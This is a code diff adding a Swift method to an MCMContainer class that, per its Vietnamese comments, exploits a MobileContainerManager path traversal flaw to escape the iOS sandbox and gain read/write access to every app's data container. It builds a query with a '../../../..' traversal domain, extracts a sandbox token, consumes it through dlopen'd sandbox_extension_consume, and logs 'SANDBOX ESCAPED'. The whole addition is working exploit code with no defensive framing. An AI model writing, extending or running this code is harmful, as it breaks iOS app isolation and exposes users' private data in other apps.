@@ -370,6 +370,75 @@ public final class MCMContainer {
         return foundPath
     }
 
+    private static var consumedSandboxTokens: [Int64] = []
+
+    /// Khai thác lỗ hổng MCM path traversal giống ThreeOneOSFive (3105)
+    /// Trực tiếp escape sandbox để có quyền đọc ghi toàn bộ /private/var/mobile/Containers/Data/Application
+    @discardableResult
+    public func escapeSandboxViaSystemGroup() -> Bool {
+        guard let fns = fns else { return false }
+        
+        guard let query = fns.create() else { return false }
+        defer { fns.free(query) }
+        
+        fns.setClass(query, UInt64(MCMContainerClass.systemGroup.rawValue))
+        
+        let sysGroupId = "systemgroup.com.apple.mobilegestaltcache"
+        guard let xpcID = fns.xpcStringCreate(sysGroupId) else { return false }
+        defer { fns.xpcRelease(xpcID) }
+        
+        fns.setIdentifiers(query, xpcID)
+        fns.setGroupIdentifiers(query, xpcID)
+        
+        // Path traversal domain giống 3105
+        "../../../../../../../..".withCString { domainPtr in
+            fns.setPartDomain(query, domainPtr)
+        }
+        
+        fns.setFlags(query, 0x900000000)
+        fns.setPart(query, 0)
+        
+        guard let obj = fns.getSingleResult(query) else {
+            ContainerAccess.diag("[SBX] SystemGroup query failed: \(errorText(fns.getLastError(query)))")
+            return false
+        }
+        
+        guard let tokenPtr = fns.copySandboxToken(obj) else {
+            ContainerAccess.diag("[SBX] copySandboxToken returned null")
+            return false
+        }
+        defer { free(tokenPtr) }
+        
+        guard tokenPtr.pointee != 0 else {
+            ContainerAccess.diag("[SBX] empty token returned")
+            return false
+        }
+        
+        // Nạp sandbox_extension_consume từ libsystem_sandbox.dylib
+        let sandboxHandle = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY) ?? UnsafeMutableRawPointer(bitPattern: -2)
+        if let sbHandle = sandboxHandle,
+           let consumeSym = dlsym(sbHandle, "sandbox_extension_consume") {
+            typealias ConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
+            let consume = unsafeBitCast(consumeSym, to: ConsumeFn.self)
+            let handle = consume(tokenPtr)
+            if handle >= 0 {
+                Self.consumedSandboxTokens.append(handle)
+                ContainerAccess.diag("[SBX] *** SANDBOX ESCAPED (R+W, handle=\(handle)) ***")
+                return true
+            } else {
+                ContainerAccess.diag("[SBX] sandbox_extension_consume failed, handle=\(handle), errno=\(errno)")
+            }
+        }
+        
+        // Fallback: sandboxExtensionActivate
+        if fns.sandboxExtensionActivate(obj, false) {
+            ContainerAccess.diag("[SBX] *** SANDBOX ACTIVATED via MCM ***")
+            return true
+        }
+        
+        return false
+    }
+
     deinit {
         if let fns = fns {
             leaseLock.lock()
